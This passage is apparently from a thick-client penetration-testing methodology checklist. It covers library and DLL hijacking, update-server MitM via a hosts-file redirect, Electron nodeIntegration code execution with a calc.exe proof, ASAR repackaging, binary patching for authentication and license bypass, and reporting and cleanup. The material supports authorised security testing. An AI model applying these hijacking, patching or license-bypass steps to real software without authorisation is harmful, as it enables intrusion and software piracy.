  ldd ./app
  ```
- [ ] **Create malicious version** of a dependency
- [ ] **Test**:
  ```bash
  LD_LIBRARY_PATH=. ./app
  ```

#### RPATH Hijacking
- [ ] **Check for insecure RPATH**:
  ```bash
  readelf -d app | grep PATH
  ```
- [ ] **If RPATH is writable directory**, place malicious .so there

---

### Update Mechanism Testing

#### Identify Update Process
- [ ] **Locate update functionality**:
  - [ ] Menu: Help → Check for Updates
  - [ ] Background update service
- [ ] **Monitor update process**:
  - [ ] Procmon: File operations
  - [ ] Wireshark: Network traffic
- [ ] **Identify update server**:
  ```
  http://updates.example.com/app.exe
  https://cdn.example.com/updates/latest.xml
  ```

#### Test Update Security
- [ ] **Check protocol**: HTTP or HTTPS?
  - [ ] If HTTP → MitM possible
- [ ] **Check certificate validation**:
  - [ ] Use proxy with invalid cert
  - [ ] Does app accept it?
- [ ] **Check signature verification**:
  - [ ] Modify downloaded update
  - [ ] Does app accept modified update?
- [ ] **Test downgrade attack**:
  - [ ] Replace update with older version
  - [ ] Does app accept it?

#### MitM Update Attack
- [ ] **Set up rogue update server**:
  ```python
  # Simple HTTP server
  python3 -m http.server 80
  ```
- [ ] **Redirect update requests**:
  ```powershell
  # Edit hosts file
  C:\Windows\System32\drivers\etc\hosts
  # Add: 127.0.0.1 updates.example.com
  ```
- [ ] **Serve malicious update**
- [ ] **Test if app accepts it**

---

### Electron-Specific Testing

#### DevTools Access
- [ ] **Enable DevTools** (if not disabled):
  ```
  Ctrl+Shift+I (Windows/Linux)
  Cmd+Option+I (macOS)
  ```
- [ ] **If DevTools open**:
  - [ ] Inspect application state
  - [ ] View localStorage/sessionStorage
  - [ ] Test for `nodeIntegration`

#### Test nodeIntegration
- [ ] **If DevTools accessible**, test in console:
  ```javascript
  // Test if Node.js is accessible
  typeof require
  
  // If nodeIntegration enabled (RCE):
  require('child_process').exec('calc.exe');  // Windows
  require('child_process').exec('gnome-calculator');  // Linux
  ```
- [ ] **Document RCE with screenshot**

#### ASAR Extraction & Analysis
- [ ] **Extract ASAR**:
  ```bash
  asar extract resources/app.asar output/
  ```
- [ ] **Review source code**:
  - [ ] Hardcoded secrets
  - [ ] API keys
  - [ ] Vulnerable dependencies
  - [ ] Dangerous Node.js usage
- [ ] **Check webPreferences** in main.js:
  ```javascript
  // Look for insecure settings:
  nodeIntegration: true
  contextIsolation: false
  enableRemoteModule: true
  webSecurity: false
  ```

#### Modify and Repackage
- [ ] **Modify JavaScript code**
- [ ] **Repackage ASAR**:
  ```bash
  asar pack output/ resources/app.asar
  ```
- [ ] **Launch app with modified ASAR**
- [ ] **Test if modifications work**

---

## Phase 4: Exploitation & Proof of Concept

### Document Vulnerabilities
For each vulnerability discovered:
- [ ] **Create entry in [[THICK-03-Request-Tracker]]**
- [ ] **Severity assessment**:
  - [ ] Critical: RCE, credential theft, system compromise
  - [ ] High: Privilege escalation, sensitive data exposure
  - [ ] Medium: License bypass, feature unlock
  - [ ] Low: Information disclosure
- [ ] **Exploitation steps documented**
- [ ] **Proof of concept created**

### Create Proof of Concept
For each exploitable vulnerability:

#### Authentication Bypass PoC
- [ ] **Document bypass method**:
  - [ ] Patched binary (save as `app_patched.exe`)
  - [ ] Modified config file
  - [ ] Modified registry values
- [ ] **Create before/after screenshots**:
  - [ ] Before: Login prompt or access denied
  - [ ] Decompiled code showing vulnerability
  - [ ] After: Successful bypass, full access
- [ ] **Video recording** (optional but recommended)

#### License/Trial Bypass PoC
- [ ] **Document bypass method**
- [ ] **Screenshots**:
  - [ ] Trial expired message
  - [ ] Decompiled license check code
  - [ ] Patched code
  - [ ] Full access after bypass
- [ ] **Save patched binary**

#### RCE PoC
- [ ] **Create exploit script**:
  ```python
  # Example: Electron RCE
  # Steps to reproduce:
  # 1. Open DevTools (Ctrl+Shift+I)
  # 2. Run in console:
  require('child_process').exec('calc.exe');
  ```
- [ ] **Screenshot showing calculator launched**
- [ ] **Video recording of exploitation**

#### DLL Hijacking PoC
- [ ] **Save malicious DLL with source code**
- [ ] **Screenshots**:
  - [ ] Procmon showing NAME NOT FOUND
  - [ ] DLL in application directory
  - [ ] Calculator launched
  - [ ] Process Explorer showing DLL loaded
- [ ] **Step-by-step exploitation guide**

#### Privilege Escalation PoC
- [ ] **Document exploitation steps**
- [ ] **Screenshots**:
  - [ ] Low-privilege user account
  - [ ] Code showing insufficient authorization check
  - [ ] Admin functionality accessed by low-priv user
- [ ] **Before/after comparison**

---

## Phase 5: Reporting

### Evidence Collection
See [[THICK-04-Evidence-Collection]] for detailed evidence requirements.

**Required for Each Finding**:
- [ ] **Vulnerability description**
- [ ] **Affected component** (file, function, module)
- [ ] **Exploitation steps** (reproducible)
- [ ] **Screenshots**:
  - [ ] Before state
  - [ ] Exploitation process
  - [ ] After state (successful exploitation)
- [ ] **Supporting files**:
  - [ ] Modified binaries (patched)
  - [ ] Exploit scripts
  - [ ] Malicious DLLs (with source)
  - [ ] Modified config files
- [ ] **Risk rating** (Critical/High/Medium/Low)
- [ ] **Business impact assessment**

### Create Report
Use [[THICK-05-Reporting-Template]] for consistent reporting.

**Each Finding Should Include**:
- [ ] Title: Descriptive and specific
- [ ] Severity: Based on impact and exploitability
- [ ] Description: Clear explanation of vulnerability
- [ ] Affected Component: Specific file, method, line number
- [ ] Exploitation Steps: Numbered, reproducible steps
- [ ] Evidence: Screenshots, code snippets, files
- [ ] Impact: Business and technical impact
- [ ] Remediation: Specific fix recommendations
- [ ] References: CVEs, OWASP, CWE references

---

## Post-Testing

### Cleanup
- [ ] Remove malicious files from test system
- [ ] Remove test accounts
- [ ] Restore original binaries
- [ ] Remove registry modifications
- [ ] Revert hosts file changes
- [ ] Restore VM to clean snapshot

### Knowledge Transfer
- [ ] Schedule debrief with client
- [ ] Prepare presentation of findings
- [ ] Demonstrate critical vulnerabilities
- [ ] Provide remediation guidance
- [ ] Answer client questions

### Methodology Improvement
- [ ] Document new techniques discovered
- [ ] Update [[THICK-06-Quick-Reference]] if needed
- [ ] Share lessons learned with team
- [ ] Update tool configurations

---

## Common Pitfalls to Avoid

- [ ] **Don't skip static analysis** - Many findings come from reviewing code before running
- [ ] **Don't overlook low-hanging fruit** - Hardcoded credentials, plaintext storage
- [ ] **Don't assume security** - Always verify protections are actually implemented
- [ ] **Don't ignore Windows/Linux-specific issues** - Platform matters
- [ ] **Don't forget to test updates** - Update mechanism often overlooked
- [ ] **Don't rush binary patching** - One wrong byte can crash the app
- [ ] **Don't forget evidence collection** - Screenshot everything during exploitation
- [ ] **Don't skip privilege levels** - Test with admin and non-admin accounts
- [ ] **Don't ignore client libraries** - Vulnerabilities often in dependencies
- [ ] **Don't forget the basics** - Check file permissions, test default credentials

---

## Tags
#technical #testing #methodology #thick-client #penetration-testing

---

## Related Documents
- [[THICK-00-Overview|Overview]]
- [[THICK-01-Admin-Checklist|Admin Checklist]]
- [[THICK-03-Request-Tracker|Request Tracker]]
- [[THICK-04-Evidence-Collection|Evidence Collection]]
- [[THICK-05-Reporting-Template|Reporting Template]]
- [[THICK-06-Quick-Reference|Quick Reference]]

---
*Created: 2026-01-22*
*Engagement: ________________*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
